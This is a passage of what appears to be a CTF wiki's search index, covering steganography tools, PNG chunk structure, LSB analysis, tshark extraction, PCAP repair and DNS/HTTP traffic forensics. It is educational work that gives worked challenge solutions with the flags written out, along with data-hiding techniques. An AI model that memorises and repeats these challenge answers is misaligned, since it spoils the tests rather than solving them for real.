steganographic content.\n-n -n Enables checking of JPEG header information to surpress false positives. If enabled, all JPEG images that contain comment fields will be treated as negatives. OutGuess checking will be disabled if the JFIF marker does not match version 1.1.\n-s Changes the sensitivity of the detection algorithms. Their results are multiplied by the specified number. The higher the number the more sensitive the test will become. The default is 1.\n-d Prints debug information.\n-t Sets the tests that are being run on the image. The following characters are understood:\n  j Tests if information has been embedded with jsteg.\n  o Tests if information has been embedded with outguess.\n  p Tests if information has been embedded with jphide.\n  i Tests if information has been hidden with invisible secrets.\n</code></pre>"},{"location":"misc/picture/jpg/#jphs","title":"JPHS","text":"<p>JPHS is a steganography tool. It is developed by Allan Latham that encrypt, hide, and detect information of lossy compressed JPEG files.  The tool contains two programs: JPHIDE and JPSEEK. Jphide program can hide information in a JPEG image. The JPSEEK program can detect and extract information hidden using the JPHIDE program. The JPHSWIN program is a Windows version of JPHS that has a graphical interface that contains JPHIDE and JPSEEK functions.</p>"},{"location":"misc/picture/jpg/#silenteye","title":"SilentEye","text":"<p>SilentEye is a cross-platform application design for an easy use of steganography, in this case hiding messages into pictures or sounds. It provides a pretty nice interface and an easy integration of new steganography algorithm and cryptography process by using a plug-ins system.</p>"},{"location":"misc/picture/png/","title":"PNG","text":""},{"location":"misc/picture/png/#file-structure","title":"File Structure","text":"<p>For a PNG file, the header is always represented by fixed bytes, and the remaining parts consist of three or more chunks of PNG data in a specific order.</p> <p>File header: <code>89 50 4E 47 0D 0A 1A 0A</code> + chunk + chunk + chunk...</p>"},{"location":"misc/picture/png/#chunks","title":"Chunks","text":"<p>PNG contains two types of chunks: one called critical chunks that are the standard chunks, another called ancillary chunks that are optional. Critical chunks define four standard chucks that must be included in every PNG file, and a PNG reader must support these blocks.</p> Chunk Characters Chunk Name Multiple Chucks Optional Position Limitation IHDR Image Header False False First Chunk cHRM Primary Chromaticities and White Point False True Before PLTE and IDAT gAMA Image Gamma False True Before PLTE and IDAT sBIT Significant Bits False True Before PLTE and IDAT PLTE Palette False True Before IDAT bKGD Background Color False True Before PLTE and IDAT hIST Image Histogram False True Before PLTE and IDAT tRNS Transparency False True Before PLTE and IDAT oFFs Image Offset False True Before IDAT pHYs Physical Pixel Dimensions False True Before IDAT sCAL Physical Scale False True Before IDAT IDAT Image Data True False Consecutive with Other IDATs tIME Image Last Modification Time False True No limit tEXt Textual Data True True No limit zTXt Compressed Textual Data True True No limit fRAc Fractal Parameters True True No limit gIFg GIF Conversion Info True True No limit gIFt GIF Plain Text True True No limit gIFx GIF Conversion Info True True No limit IEND Image Trailer False False End of PNG Data Stream <p>There is a unified structure for each chunk, and each chunk is composed of four parts:</p> Name Length in Bytes Description Length 4 Bytes Specifies the length of the data field in the chunk, which does not exceed (231-1) bytes Chunk Type Code 4 Bytes Consists of ASCII letters (A-Z and A-Z) Chunk Data length Varies Stores the data specified by the Chunk Type Code CRC 4 Bytes Stores the Cyclic Redundancy Check information <p>CRC\uff08Cyclic Redundancy Check\uff09value is calculated based on the Chunk Type Code and Chunk Data.</p> <p>For more details, see PNG Chunks</p>"},{"location":"misc/picture/png/#ihdr","title":"IHDR","text":"<p>IHDR (Image Header Chunk): It stores basic image information, 13-bytes long, must be the first chunk in a PNG data stream, and there must be only one file header chunk in a PNG data stream.</p> Name Number of Bytes Description Width 4 bytes Image width (in pixels) Height 4 bytes Image height (in pixels) <p>We often change the height or width of an image to corrupt it to hide information.</p> <p></p> <p>You can see here Kali won\u2019t open the image, showing the <code>IHDR CRC error</code>. This is a sign that the IHDR chunk was modified.</p> <p>You might be able to restore the corrupted image by changing the image\u2019s width and length, or file header back to the correct values.</p>"},{"location":"misc/picture/png/#ctf-example","title":"CTF Example","text":""},{"location":"misc/picture/png/#wdctf-finals-2017","title":"WDCTF-finals-2017","text":"<p>Download the challenge here</p> <p>If you look at the file, you can see that the header and width of the PNG file are incorrect.</p> <pre><code>00000000  80 59 4e 47 0d 0a 1a 0a  00 00 00 0d 49 48 44 52  |.YNG........IHDR|\n00000010  00 00 00 00 00 00 02 f8  08 06 00 00 00 93 2f 8a  |............../.|\n00000020  6b 00 00 00 04 67 41 4d  41 00 00 9c 40 20 0d e4  |k....gAMA...@ ..|\n00000030  cb 00 00 00 20 63 48 52  4d 00 00 87 0f 00 00 8c  |.... cHRM.......|\n00000040  0f 00 00 fd 52 00 00 81  40 00 00 7d 79 00 00 e9  |....R...@..}y...|\n...\n</code></pre> <p>Note that you can't just randomly change the image's width, you need to brute force the width based on the IHDR chunk's CRC value (see Python script below).</p> <pre><code>import os\nimport binascii\nimport struct\n\nmisc = open(\"misc4.png\",\"rb\").read()\n\nfor i in range(1024):\n    data = misc[12:16] + struct.pack('&gt;i',i)+ misc[20:29]\n    crc32 = binascii.crc32(data) &amp; 0xffffffff\n    if crc32 == 0x932f8a6b:\n        print(i)\n</code></pre> <p>The script returned <code>709</code>, so changing the image's width to <code>709</code> will restore the image and get you the flag.</p> <p></p>"},{"location":"misc/picture/png/#plte","title":"PLTE","text":"<p>PLTE (Palette Chunk): It contains from 1 to 256 palette entries, each a three-byte series of the form.    - Red:   1 byte (0 = black, 255 = red)    - Green: 1 byte (0 = black, 255 = green)    - Blue:  1 byte (0 = black, 255 = blue)</p>"},{"location":"misc/picture/png/#idat","title":"IDAT","text":"<p>IDAT (Image Data Chunk): It stores the actual image data which contains multiple image chucks in the data stream. -   Stores image data -   Contains multiple image chucks in the data stream -   Uses a derivative of LZ77 algorithm to perform compression -   Uses zlib to perform decompression</p> <p>Note that IDAT will only continue to a new chunk when the previous chunk is full.</p>"},{"location":"misc/picture/png/#ctf-example_1","title":"CTF Example","text":""},{"location":"misc/picture/png/#sctf-2014-misc","title":"sctf 2014 - misc","text":"<p>Use <code>pngcheck</code> display information about the PNG file</p> <p>Download the challenge here</p> <pre><code>.\\pngcheck.exe -v sctf.png\nFile: sctf.png (1421461 bytes)\n  chunk IHDR at offset 0x0000c, length 13\n    1000 x 562 image, 32-bit RGB+alpha, non-interlaced\n  chunk sRGB at offset 0x00025, length 1\n    rendering intent = perceptual\n  chunk gAMA at offset 0x00032, length 4: 0.45455\n  chunk pHYs at offset 0x00042, length 9: 3780x3780 pixels/meter (96 dpi)\n  chunk IDAT at offset 0x00057, length 65445\n    zlib: deflated, 32K window, fast compression\n  chunk IDAT at offset 0x10008, length 65524\n...\n  chunk IDAT at offset 0x150008, length 45027\n  chunk IDAT at offset 0x15aff7, length 138\n  chunk IEND at offset 0x15b08d, length 0\nNo errors detected in sctf.png (28 chunks, 36.8% compression).\n</code></pre> <p>We can see when the first IDAT is full (length <code>65524</code>), it continued to the second IDAT. Now, we know the length for a full IDAT. Try to compare the last two IDAT (offset <code>0x150008</code> and <code>0x15aff7</code> ), do you see anything strange?</p> <p>The second to last IDAT length is <code>45027</code> and the last IDAT length is <code>138</code>.</p> <p>Clearly, something is wrong with the last IDAT because the second to last IDAT is not full.</p> <p>Use <code>python</code> and <code>zlib</code> to decompress the content of the last IDAT. Note that length, chunk type, and CRC check value at the end are excluded.</p> <pre><code>import zlib\nimport binascii\nIDAT = \"789...667\".decode('hex')\nresult = binascii.hexlify(zlib.decompress(IDAT))\nprint result\n</code></pre>"},{"location":"misc/picture/png/#iend","title":"IEND","text":"<p>IEND (Image Trailer Chunk): It is used to mark the end of a PNG data stream or file, and it must be placed at the end of the file.</p>"},{"location":"misc/picture/png/#example","title":"Example","text":"<ul> <li>IEND's chunk length is always <code>00 00 00 00</code></li> <li>IEND's chunk type is always IEND <code>49 45 4E 44</code></li> <li>IEND'S CRC value is always <code>AE 42 60 82</code></li> </ul> <p>That means a PNG file will always end with these bytes:</p> <p><code>00 00 00 00 49 45 4E 44 AE 42 60 82</code></p>"},{"location":"misc/picture/png/#lsb","title":"LSB","text":"<p>LSB stands for Least Significant Bit. Each pixel in a PNG image is generally composed of RGB three primary colors (red, green, and blue), each color occupies 8 bits, and the value range is from '0x00' to '0xFF', so there are 256 colors. The total number of colors is equal to 256 to the third power or 16777216.</p> <p>The human eye can distinguish about 10 million different colors, which means the human eye cannot distinguish the remaining 6,777,216 colors.</p> <p>LSB steganography is to modify the Least Significant Bit of each color, containing 8 bits, in an RGB value.</p> <p></p> <p>If you want to find informing hidden using LSB, you can use this tool Stegsolve to perform analysis.</p> <p>Use the buttons at the bottom of Stegsolve to see information extracted from each color channel.</p> <p>In the following image, we found the hidden information by checking LSB on the red channel:</p> <p></p> <p>With the help of StegSolve, you can find hidden information by checking LSB each color channel.</p>"},{"location":"misc/picture/png/#ctf-example_2","title":"CTF Example","text":""},{"location":"misc/picture/png/#hctf-2016-pic-again","title":"HCTF 2016 - pic again","text":"<p>Download the challenge here</p> <p>There is information hidden in the LSB of the RGB colors. Use <code>Stegsolve--&gt;Analyse--&gt;Data Extract</code> to extract it.</p> <p></p> <p>We can see <code>zip</code> file header, use <code>save bin</code> to save the zip file, and run the ELF executable to obtain the flag.</p>"},{"location":"misc/traffic/data/","title":"Data Extraction","text":"<p>By analyzing the protocols, you can narrow down where data exfiltration occurred.</p> <p>Next, you need to know how to extract the data, which is an important part of network traffic analysis.</p>"},{"location":"misc/traffic/data/#wireshark","title":"Wireshark","text":"<ul> <li> <p>Wireshark automatic extraction: <code>file -&gt; export objects -&gt; http</code></p> </li> <li> <p>Manual data extraction: <code>file-&gt;export selected Packet Bytes</code></p> </li> </ul>"},{"location":"misc/traffic/data/#tshark","title":"tshark","text":"<p>As a command-line version of wireshark, <code>tshark</code> is an efficient and fast. It can be used flexibly with other command-line tools (<code>awk</code>, <code>grep</code>) to quickly locate and extract data, thus eliminating the need for complicated scripting.</p>"},{"location":"misc/traffic/data/#common-methods","title":"Common Methods","text":"<p><code>tshark -r **.pcap \u2013Y ** -T fields \u2013e ** | **** &gt; data</code></p> <pre><code>Usage:\n  -Y &lt;display filter&gt;      packet displaY filter in Wireshark display filter syntax\n  -T pdml | ps | psml | json | jsonraw | ek | tabs | text | fields | ? format of text output (def: text)\n  -e &lt;field&gt;               field to print if -Tfields selected (e.g. tcp.port, _ws.col.Info)\n</code></pre> <p>Passing the <code>-Y</code> option allows you to apply display filters (same filter as Wireshark), then <code>-T fields -e</code> will let to extract specific fields (such as <code>usb.capdata</code>).</p> <p>Tips</p> <p>If you are not sure about the field name, you can right-click on the field in <code>Wireshark</code> of a packet, then Apply as Filter \u2192 Selected. You should then see the field name in the filter bar.</p>"},{"location":"misc/traffic/data/#ctf-example","title":"CTF Example","text":""},{"location":"misc/traffic/data/#google-ctf-2016-a-cute-stegosaurus","title":"Google CTF 2016 - a cute stegosaurus","text":"<p>Download the challenge here</p> <p>The data was hidden very cleverly. There was an image, but it's a rabbit hole and caused a lot of confusion.</p> <p>For this challenge, you need to be familiar with the <code>tcp</code> protocol.</p> <p>There are 6 bits of status code in the TCP message segment:</p> <ul> <li>URG: Urgent bit. When URG=1, it means the packet is an urgent packet. It tells the system that there is urgent data in this segment and that it should be sent as soon as possible (equivalent to high-priority data)</li> <li>ACK: Acknowledge bit. When ACK=1, it means the packet is an acknowledgment packet. When ACK=0, the packet is not an acknowledgment packet. The server acknowledges data is received by sending ACK=1 to the sender or client.</li> <li>PSH: Push bit. When PSH=1, it means the other party asks the packets in the buffer to be sent immediately, without waiting for the buffer to be full.</li> <li>RST: Reset bit. When RST=1, it means to aborts a connection due to errors, then the connection must be released and re-established.</li> <li>SYN: Synchronous bit. When SYN=1, it means the packet is making an initiation request to connect. Usually, the packet with the SYN flag means the client is trying to make a connection to the server.</li> <li>FIN: Final bit. When FIN=1, it means to release or close a connection.</li> </ul> <p></p> <p>Extract the <code>tcp.urg</code> (Urgent pointer in the image above) with tshark, then remove the <code>0</code> field and replace the newline with <code>,</code>. Use Python to convert the numbers into ASCII to get the flag.</p> <pre><code>tshark -r stego.pcap -T fields -e  tcp.urgent_pointer | egrep -vi \"^0$\" | tr '\\n' ','\n\n67,84,70,123,65,110,100,95,89,111,117,95,84,104,111,117,103,104,116,95,73,116,95,87,97,115,95,73,110,95,84,104,101,95,80,105,99,116,117,114,101,125\n</code></pre> <p>Use Python to convert to ASCII:</p> <pre><code>arr = [67,84,70,123,65,110,100,95,89,111,117,95,84,104,111,117,103,104,116,95,73,116,95,87,97,115,95,73,110,95,84,104,101,95,80,105,99,116,117,114,101,125]\nprint(\"\".join([chr(x) for x in arr]))\n</code></pre> <p>Flag: <code>CTF{And_You_Thought_It_Was_In_The_Picture}</code></p>"},{"location":"misc/traffic/data/#related-ctf-challenges","title":"Related CTF Challenges","text":"<ul> <li> <p>HITCON-2018 - ev3 basic</p> </li> <li> <p>HITCON-2018 - ev3 scanner</p> </li> </ul>"},{"location":"misc/traffic/fix/","title":"PCAP File Repairing","text":""},{"location":"misc/traffic/fix/#pcap-file-structure","title":"PCAP File Structure","text":"<p>In general, there are few investigations about the <code>PCAP</code> file format, and usually can be directly repaired by means of off-the-shelf tools such as <code>pcapfix</code>.</p> <ul> <li>Tools<ul> <li>PcapFix Online</li> <li>PcapFix</li> </ul> </li> </ul> <p>General file structure:</p> <pre><code>0                   1                   2                   3   \n0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|                          Block Type                           |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|                      Block Total Length                       |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n/                          Block Body                           /\n/          /* variable length, aligned to 32 bits */            /\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|                      Block Total Length                       |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n</code></pre> <p>The common block types defined are:</p> <ol> <li> <p>Section Header Block: it defines the most important characteristics of the capture file.</p> </li> <li> <p>Interface Description Block: it defines the most important characteristics of the interface(s) used for capturing traffic.</p> </li> <li> <p>Packet Block: it contains a single captured packet or a portion of it.</p> </li> <li> <p>Simple Packet Block: it contains a single captured packet, or a portion of it, with only a minimal set of information about it.</p> </li> <li> <p>Name Resolution Block: it defines the mapping from numeric addresses present in the packet dump and the canonical name counterpart.</p> </li> <li> <p>Capture Statistics Block: it defines how to store some statistical data (e.g. packet dropped, etc) which can be useful to understand the conditions in which the capture has been made.</p> </li> </ol>"},{"location":"misc/traffic/fix/#common-blocks","title":"Common Blocks","text":""},{"location":"misc/traffic/fix/#section-header-block","title":"Section Header Block","text":"<p>Must exist, indicating the beginning of the file.</p> <pre><code>0                   1                   2                   3   \n0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|                Byte-Order Magic (0x1A2B3C4D)                  |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|   Major Version              |    Minor Version               |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|                                                               |\n|                          Section Length                       |\n|                                                               |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n/                                                               /\n/                      Options (variable)                       /\n/                                                               /\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n</code></pre>"},{"location":"misc/traffic/fix/#interface-description-block","title":"Interface Description Block","text":"<p>Must exist, describe interface characteristics</p> <pre><code>0                   1                   2                   3   \n0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|           LinkType            |           Reserved            |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|                  SnapLen(Amount of Data per Frame)            |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n/                                                               /\n/                      Options (variable)                       /\n/                                                               /\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n</code></pre>"},{"location":"misc/traffic/fix/#packet-block","title":"Packet Block","text":"<pre><code>0                   1                   2                   3   \n0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|         Interface ID          |          Drops Count          |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|                     Timestamp (High)    In Unix Format        |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|                        Timestamp (Low)                        |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|                         Captured Len                          |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|                          Packet Len                           |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n/                          Packet Data                          /\n/          /* variable length, aligned to 32 bits */            /\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n/                      Options (variable)                       /\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n</code></pre>"},{"location":"misc/traffic/fix/#ctf-example","title":"CTF Example","text":""},{"location":"misc/traffic/fix/#baidu-cup-find-the-flag","title":"Baidu Cup - Find the Flag","text":"<p>Download the challenge here</p> <p>First, the challenge title <code>Find the Flag</code> hints that we must find the string contains <code>flag</code>.</p> <p>First step, search for <code>flag</code> string</p> <p>We will search for <code>flag</code> string with the <code>strings</code> command. Windows users can use the search function of <code>notepad++</code>.</p> <p>The search command:</p> <pre><code>strings findtheflag.cap | grep flag\n</code></pre> <p></p> <p>We found out that a lot of matched strings, but it's not what we looking for.</p> <p>Step 2, Repair the Traffic Packets File</p> <p>We opened this PCAP file with <code>wireshark</code></p> <p></p> <p>However, it displayed an error message and seems corrupted, so we need to fix it.</p> <p>We used this online tool to helps us quickly fix its PCAP file: http://f00l.de/hacking/pcapfix.php</p> <p></p> <p>After the repair is complete, click <code>Get your repaired PCAP-file here.</code> to download the repaired PCAP file, then open it with <code>wireshark</code>.</p> <p>Since we still have to find the <code>flag</code>, we will analyze traffics with <code>wireshark</code>.</p> <p>Step 3, Follow the TCP Streams</p> <p>Let's follow the TCP Streams and see if there is anything interesting?</p> <p></p> <p>By following the <code>TCP</code> streams, we found some version information, cookie, etc. We still found something interesting.</p> <p>From <code>tcp.stream eq 29</code> to <code>tcp.stream eq 41</code>, they show the words <code>where is the flag?</code>. Is it hinting the <code>flag</code> is here?</p> <p>Step 4, Find the grouped byte stream</p> <p>When we follow <code>tcp.stream eq 29</code>, we saw <code>lf</code> in the <code>Identification</code> message. We can continue to follow the next stream, <code>Identification</code> in <code>tcp.stream eq 30</code> we see <code>ga</code>. We discovered that corresponding <code>Identification</code> fields in the two packets when combined from right to left, becomes <code>flag</code>! So we can guess the <code>flag</code> is inside the <code>Identification</code> fields.</p> <p>We can find the remaining parts of the flag by using the search by strings feature in <code>wireshark</code>. Edit \u2192 Find Packet \u2192 Select Packet bytes \u2192 Select Narrow &amp; Wide \u2192 Select String, then enter <code>flag</code> in search field.</p> <p>Here are the screenshots of the search:</p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p>So the final <code>flag</code> is: flag{aha!_you_found_it!}</p>"},{"location":"misc/traffic/fix/#references","title":"References","text":"<ul> <li> <p>http://www.tcpdump.org/pcap/pcap.html</p> </li> <li> <p>https://zhuanlan.zhihu.com/p/27470338</p> </li> <li> <p>https://www.cnblogs.com/ECJTUACM-873284962/p/9884447.html</p> </li> </ul>"},{"location":"misc/traffic/introduction/","title":"Introduction to Traffic Packet Analysis","text":"<p>In CTFs, analyzing traffic packets is an important part of performing an investigation.  </p> <p>Often the competition will provide a traffic packets PCAP file, where players need to repair or rebuild the files transferred in the PCAP file to perform analysis.</p> <p>PCAP is the key research direction, the complication is that the packets are filled with a lot of irrelevant traffics, so filter out the irrelevant traffics will be necessary.</p> <p>Overall, there are the following steps:</p> <ul> <li>Overall Grasp</li> <li>Agreement Rating</li> <li>Endpoint Statistics</li> <li>Filter Relevant Information</li> <li>Filter Syntax</li> <li>Host, Protocol, Contains, Flags</li> <li>Find Exceptions</li> <li>Special Strings</li> <li>A Protocol Field</li> <li>Flag Located On The Server</li> <li>Data Extraction</li> <li>Strings Extraction</li> <li>Files Extraction</li> </ul> <p>In general, CTF traffic packets analysis falls into these 3 categories:</p> <ul> <li>Repair Traffic Packet (PCAP) File</li> <li>Protocol Analysis</li> <li>Data Extraction</li> </ul>"},{"location":"misc/traffic/protocols/","title":"Overview of Protocol Analysis","text":"<p>A network protocol is an established set of rules that determine how data is transmitted between different devices in the same network. Essentially, it allows connected devices to communicate with each other, regardless of any differences in their internal processes, structure, or design.</p> <p>Network protocols are the reason you can easily communicate with people all over the world, and thus play a critical role in modern digital communications.</p> <p>In this selection on protocol analysis, we will cover the following:</p> <ul> <li><code>Wireshark</code> Common Features</li> <li><code>HTTP</code> Protocol Analysis</li> <li><code>HTTPS</code> Protocol Analysis</li> <li><code>FTP</code> Protocol Analysis</li> <li><code>DNS</code> Protocol Analysis</li> <li><code>WIFI</code> Protocol Analysis</li> <li><code>USB</code> Protocol Analysis</li> </ul>"},{"location":"misc/traffic/protocols/DNS/","title":"DNS","text":""},{"location":"misc/traffic/protocols/DNS/#dns","title":"DNS","text":"<p><code>DNS</code> uses <code>UDP</code> protocol.</p> <p>Message format:</p> <pre><code>+----------------------------------------------------------+\n| Message Header                                           |\n+----------------------------------------------------------+\n| Question (record of a query to the server)                 |\n+----------------------------------------------------------+\n| Answer (record of server reply)                          |\n+----------------------------------------------------------+\n| Authorization (NS record for authoritative zone servers) |\n+----------------------------------------------------------+\n| Additional (additional useful information)               |\n+----------------------------------------------------------+\n</code></pre> <p>The query packet only has two parts: the header and the question. After receiving the query packet, DNS parses answer information, the authorized organization, the additional resource record according to the query information, and modify the relevant identification of the header and then return it to the client.</p> <p>The query header has a fixed length of 12 bytes and contains the query/reply packet information in the following format:</p> <pre><code>                                1  1  1  1  1  1\n  0  1  2  3  4  5  6  7  8  9  0  1  2  3  4  5\n+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+\n|                      ID                       |\n+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+\n|QR|   Opcode  |AA|TC|RD|RA|   Z    |   RCODE   |\n+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+\n|                    QDCOUNT                    |\n+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+\n|                    ANCOUNT                    |\n+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+\n|                    NSCOUNT                    |\n+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+\n|                    ARCOUNT                    |\n+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+\n</code></pre> <ul> <li><code>ID</code>: ID set by the client, the reply message must have the same id to distinguish which query the reply message belongs to.</li> <li><code>QR</code>: Indicates if the message is a query (0) or a reply (1).</li> <li><code>AA</code>: Authoritative Answer, in a response, indicates if the DNS server is authoritative for the queried hostname.</li> <li><code>TC</code>: Truncation, indicates that this message was truncated due to excessive length.</li> <li><code>RD</code>: Recursion Desired, indicates if the client means a recursive query.</li> <li><code>RA</code>: Recursion Available, in a response, indicates if the replying DNS server supports recursion.</li> <li><code>Z</code>: Zero, reserved for future use.</li> <li><code>RCODE</code>: Response code, can be NOERROR (0), FORMERR (1, Format error), SERVFAIL (2), NXDOMAIN (3, Nonexistent domain)...</li> </ul> <p>Every question selection format:</p> <pre><code>  0  1  2  3  4  5  6  7  8  9  0  1  2  3  4  5\n+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+\n|                                               |\n/                     QNAME                     /\n/                                               /\n+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+\n|                     QTYPE                     |\n+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+\n|                     QCLASS                    |\n+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+\n</code></pre> <ul> <li><code>QNAME</code>: Name of the requested resource.</li> <li><code>QTYPE</code>: Type of RR (A, AAAA, MX, TXT, etc.).</li> <li><code>QCLASS</code>: Class code.</li> </ul>"},{"location":"misc/traffic/protocols/DNS/#ctf-example","title":"CTF Example","text":""},{"location":"misc/traffic/protocols/DNS/#bsides-san-francisco-ctf-2017-dnscap","title":"BSides San Francisco CTF 2017 - dnscap","text":"<p>Download the PCAP file here</p> <p>We opened the PCAP file in <code>Wireshark</code> and found all the traffics is using the <code>DNS</code> protocol.</p> <p>There are many bytes in the DNS query domain name.</p> <p>We can use this Regex to find all the requested domain names:  <code>([\\w\\.]+)\\.skullseclabs\\.org</code></p> <p>Remove the rest of the fields in <code>qry.name</code>, leaving only <code>data</code> part, thus merging the data, then retrieving <code>89504e.....6082</code> in hex.</p> <p>Note</p> <p>Run this script in Python2</p> <pre><code>import re\n\nfind = []\n\nwith open('hex','rb') as f:\n    for i in f:\n        text = re.findall(r'([\\w\\.]+)\\.skull',i)\n        if text:\n            tmp =  text[0].replace('.','')\n            find.append(tmp[18:])\nlast = []\n\nfor i in find:\n    if i not in last:\n        last.append(i)\n\nprint  ''.join(last)\n</code></pre> <p>Now, convert the hex to file and then extract the png file from it.</p> <p>Using CyberChef to convert and extract the file, we got the flag.</p> <p>Flag:</p> <p></p>"},{"location":"misc/traffic/protocols/DNS/#related-ctf-challenges","title":"Related CTF Challenges","text":"<ul> <li> <p>IceCTF-2016:Search</p> </li> <li> <p>EIS-2017:DNS 101</p> </li> </ul>"},{"location":"misc/traffic/protocols/DNS/#references","title":"References","text":"<ul> <li> <p>https://github.com/lisijie/homepage/blob/master/posts/tech/dns%E5%8D%8F%E8%AE%AE%E8%A7%A3%E6%9E%90.md</p> </li> <li> <p>https://xpnsec.tumblr.com/post/157479786806/bsidessf-ctf-dnscap-walkthrough</p> </li> </ul>"},{"location":"misc/traffic/protocols/FTP/","title":"FTP","text":""},{"location":"misc/traffic/protocols/FTP/#ftp","title":"FTP","text":"<p>FTP (File Transfer Protocol) is one of the protocols in the TCP/IP Protocol group. The FTP protocol consists of two parts, the FTP server, and the FTP client. The FTP server is used to store the files, and the user can use the FTP client to access the resources located on the FTP server through the FTP protocol. When developing a website, the FTP protocol is usually used to upload web pages or programs to the Web server. In addition, because the FTP transfer rate is quite fast, it\u2019s commonly used for transferring large files over the network.</p> <p>By default, the FTP protocol uses TCP ports 20 and 21. Port 20 is for transmitting data, and port 21 for transmitting commands. However, the data transfer port depends on the transfer mode used by FTP. If active mode is used, then the data transfer port is 20 used. If passive mode is enabled, the specific port used can be decided by the server and the client.</p>"},{"location":"misc/traffic/protocols/HTTP/","title":"HTTP","text":""},{"location":"misc/traffic/protocols/HTTP/#http","title":"HTTP","text":"<p>HTTP (Hyper Text Transfer Protocol) is an application layer protocol for distributed, collaborative, and hypermedia information systems. HTTP is the foundation of data communication for the World Wide Web, where hypertext documents include hyperlinks to other resources that the user can easily access, for example by a mouse click or by tapping the screen in a web browser.</p>"},{"location":"misc/traffic/protocols/HTTP/#ctf-example","title":"CTF Example","text":""},{"location":"misc/traffic/protocols/HTTP/#jiangsu-province-navigator-cup-2017-hack","title":"Jiangsu Province Navigator Cup - 2017: hack","text":"<p>Download the challenge here</p> <p>These observations can be drawn:</p> <ul> <li><code>HTTP</code> is used</li> <li><code>102.168.173.134</code> is the client</li> <li>No attachments exist</li> </ul> <p></p> <p>From this picture, we can see blind SQL injection is in traffic packets.</p> <p>At this point, you can determine the direction to obtain the flag: extracting all the URLs, then use <code>Python</code>.</p> <ul> <li> <p>Extract URLs: <code>tshark -r hack.pcap -T fields  -e http.request.full_uri|tr -s '\\n' | grep flag &gt; log</code></p> </li> <li> <p>Parse blind SQL injection requests</p> </li> </ul> <pre><code>import re\n\nwith open('log') as f:\n    tmp = f.read()\n    flag = ''\n    data = re.findall(r'=(\\d*)%23',tmp)\n    data = [(int(i)) for i in data]\n\n    for i,num in enumerate(data):\n        try:\n            if num &gt; data[i+1]:    \n                flag += chr(num)\n        except Exception:\n            pass\n\n    print(flag)\n</code></pre>"},{"location":"misc/traffic/protocols/HTTPS/","title":"HTTPS","text":""},{"location":"misc/traffic/protocols/HTTPS/#https","title":"HTTPS","text":"<p><code>HTTPs = HTTP + SSL / TLS</code>. In HTTPS, the communication protocol is encrypted using Transport Layer Security (TLS) or, formerly, Secure Sockets Layer 